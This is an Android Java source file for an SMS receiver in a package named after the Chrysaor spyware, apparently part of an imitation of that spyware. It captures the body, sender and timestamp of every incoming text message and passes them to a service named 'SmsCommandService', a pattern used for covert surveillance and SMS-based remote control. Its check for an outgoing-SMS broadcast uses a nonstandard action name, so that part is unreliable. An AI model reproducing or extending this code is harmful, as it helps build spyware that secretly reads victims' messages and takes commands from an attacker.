package com.android.chrysaoralike;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SmsCommandReceiver extends BroadcastReceiver {
    private static final String TAG = "SmsCommandReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if ("android.provider.Telephony.SMS_RECEIVED".equals(action)) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                        if (sms != null) {
                            String body = sms.getMessageBody();
                            String sender = sms.getDisplayOriginatingAddress();
                            long timestamp = sms.getTimestampMillis();
                            Intent serviceIntent = new Intent(context, SmsCommandService.class);
                            serviceIntent.putExtra("action", "incoming_sms");
                            serviceIntent.putExtra("sender", sender);
                            serviceIntent.putExtra("body", body);
                            serviceIntent.putExtra("timestamp", timestamp);
                            context.startService(serviceIntent);
                        }
                    }
                }
            }
        } else if ("android.provider.Telephony.NEW_OUTGOING_SMS".equals(action)) {
            // For outgoing SMS
        }
    }
}